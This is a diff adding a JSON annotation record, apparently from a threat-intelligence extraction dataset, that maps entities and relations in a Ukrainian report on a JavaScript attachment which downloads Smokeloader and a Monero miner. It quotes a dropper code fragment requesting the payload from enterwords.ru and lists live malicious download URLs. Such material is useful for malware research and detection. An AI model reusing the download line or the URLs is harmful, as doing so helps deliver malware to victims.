@@ -1,0 +1,174 @@
+{
+  "docId": 2727,
+  "date": "22.02.2018",
+  "title": "Поширення Monero Mining, через Smokeloader",
+  "entities": [
+    {
+      "id": "2727:0",
+      "name": "Smokeloader",
+      "kind": "malware family",
+      "gloss": "A generic modular malware loader used to download and execute secondary malicious payloads.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "2727:1",
+      "name": "Monero",
+      "kind": "cryptocurrency",
+      "gloss": "A privacy-focused cryptocurrency frequently mined by unauthorized cryptojacking malware.",
+      "scheme": null,
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "2727:2",
+      "name": "Заявка.js",
+      "kind": "malicious script file",
+      "gloss": "A malicious JavaScript file distributed via email to download Smokeloader.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "2727:3",
+      "name": "crsse.exe",
+      "kind": "malware file",
+      "gloss": "A malicious executable file delivering the Smokeloader payload disguised as a legitimate Windows process.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "2727:4",
+      "name": "1964.exe",
+      "kind": "malware file",
+      "gloss": "A local filename used to store the downloaded crsse.exe Smokeloader payload in the temporary directory.",
+      "scheme": "S12",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2727:5",
+      "name": "csrss.exe",
+      "kind": "operating system component",
+      "gloss": "A critical legitimate Windows operating system process responsible for console windows and process management.",
+      "scheme": "S2",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2727:6",
+      "name": "explorer.exe",
+      "kind": "operating system component",
+      "gloss": "A legitimate Windows user interface and shell process targeted for process injection by malware.",
+      "scheme": "S2",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "2727:7",
+      "name": "curl.exe",
+      "kind": "malware file",
+      "gloss": "A malicious executable containing a Monero cryptocurrency mining program.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "2727:8",
+      "name": "enterwords.ru",
+      "kind": "internet domain",
+      "gloss": "A domain name used to host and distribute the Smokeloader malware payload.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "related"
+    },
+    {
+      "id": "2727:9",
+      "name": "http://enterwords.ru/uadoc/crsse.exe",
+      "kind": "malicious url",
+      "gloss": "A URL hosting the crsse.exe Smokeloader payload for download.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": "attacker"
+    },
+    {
+      "id": "2727:10",
+      "name": "parodadoca.ru",
+      "kind": "internet domain",
+      "gloss": "A domain name used to host and distribute a Monero miner executable.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "related"
+    },
+    {
+      "id": "2727:11",
+      "name": "http://parodadoca.ru/panel/mr/curl.exe",
+      "kind": "malicious url",
+      "gloss": "A URL used to download the curl.exe Monero miner executable.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": "attacker"
+    }
+  ],
+  "relations": [
+    {
+      "head": "Заявка.js",
+      "type": "downloads-payload",
+      "tail": "http://enterwords.ru/uadoc/crsse.exe",
+      "evidence": "В самому Javascript шкідливий код... $http_request.open('GET', 'http://enterwords.ru/uadoc/crsse.exe', $false)"
+    },
+    {
+      "head": "http://enterwords.ru/uadoc/crsse.exe",
+      "type": "delivers-file",
+      "tail": "crsse.exe",
+      "evidence": "скачує з сайту hXXp://enterwords.ru/uadoc/crsse.exe файл crsse.exe"
+    },
+    {
+      "head": "http://enterwords.ru/uadoc/crsse.exe",
+      "type": "hosted-on",
+      "tail": "enterwords.ru",
+      "evidence": "скачує з сайту hXXp://enterwords.ru/uadoc/crsse.exe"
+    },
+    {
+      "head": "crsse.exe",
+      "type": "is-instance-of",
+      "tail": "Smokeloader",
+      "evidence": "Crsse.exe це шкідливе програмне забезпечення забезпечення типу Smokeloader"
+    },
+    {
+      "head": "Smokeloader",
+      "type": "injects-into-process",
+      "tail": "explorer.exe",
+      "evidence": "запускається та інфікується, шкідливим кодом, процес explorer.exe"
+    },
+    {
+      "head": "explorer.exe",
+      "type": "downloads-payload",
+      "tail": "http://parodadoca.ru/panel/mr/curl.exe",
+      "evidence": "Він скачує з hXXp://parodadoca.ru/panel/mr/curl.exe файл curl.exe"
+    },
+    {
+      "head": "http://parodadoca.ru/panel/mr/curl.exe",
+      "type": "delivers-file",
+      "tail": "curl.exe",
+      "evidence": "скачує з hXXp://parodadoca.ru/panel/mr/curl.exe файл curl.exe"
+    },
+    {
+      "head": "http://parodadoca.ru/panel/mr/curl.exe",
+      "type": "hosted-on",
+      "tail": "parodadoca.ru",
+      "evidence": "скачує з hXXp://parodadoca.ru/panel/mr/curl.exe"
+    },
+    {
+      "head": "curl.exe",
+      "type": "mines-cryptocurrency",
+      "tail": "Monero",
+      "evidence": "файл curl.exe, який є програмою для майнингу криптовалюти Monero"
+    }
+  ],
+  "unclassified": [
+    "2727:1"
+  ]
+}
